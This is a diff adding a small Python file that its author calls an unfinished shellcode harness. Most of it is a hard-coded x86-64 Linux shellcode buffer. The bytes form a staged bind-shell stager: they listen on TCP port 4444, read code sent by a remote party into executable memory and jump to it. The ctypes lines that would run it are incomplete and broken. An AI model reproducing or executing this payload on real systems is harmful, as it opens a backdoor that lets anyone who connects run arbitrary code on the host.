@@ -1,0 +1,24 @@
+import ctypes
+
+"""
+maybe this will become a python shellcode harness someday once i learn how to not be terrible at ctypes.
+"""
+
+
+buf = b""
+buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
+buf += b"\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a"
+buf += b"\x10\x5a\x6a\x31\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05"
+buf += b"\x48\x96\x6a\x2b\x58\x0f\x05\x50\x56\x5f\x6a\x09\x58"
+buf += b"\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a"
+buf += b"\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f\x05\xff\xe6"
+cbuf = ctypes.create_string_buffer(buf)
+
+
+print(type(cbuf))
+print(type(ctypes.pointer(cbuf)))
+cfunc = ctypes.cast(cbuf, ctypes._CFuncPtr())
+cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_int)
+
+print(type(cfunc))
+print(dir(cfunc))
